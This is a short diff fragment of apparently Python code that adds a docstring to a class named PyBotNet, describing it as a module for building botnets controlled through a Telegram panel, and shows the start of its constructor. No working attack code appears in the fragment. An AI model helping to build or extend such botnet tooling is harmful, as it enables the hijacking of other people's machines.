@@ -6,8 +6,12 @@ import util
 
 
 class PyBotNet:
+    '''
+    A module for building botnets with Python and Telegram control panel\n
+    '''
 
     def __init__(
+
         self,
         TELEGRAM_TOKEN,
         ADMIN_CHAT_ID,
